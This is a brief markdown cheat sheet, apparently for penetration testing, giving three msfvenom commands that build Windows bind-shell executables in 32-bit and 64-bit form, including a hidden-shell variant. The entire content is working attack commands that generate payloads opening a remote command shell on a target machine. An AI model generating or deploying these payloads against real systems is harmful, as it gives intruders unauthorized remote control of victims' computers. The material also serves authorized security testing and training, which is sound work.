# Bind Shells

## 01 - x86 (32-bit) Payloads

```
$ msfvenom -p windows/shell_bind_tcp lport=<PORT> -f exe -o shell-x86.exe

$ msfvenom -p windows/shell_bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-shell-x86.exe
```

## 02 - x86-64 (64-bit) Payloads

```
$ msfvenom -p windows/x64/shell_bind_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x86-64.exe
```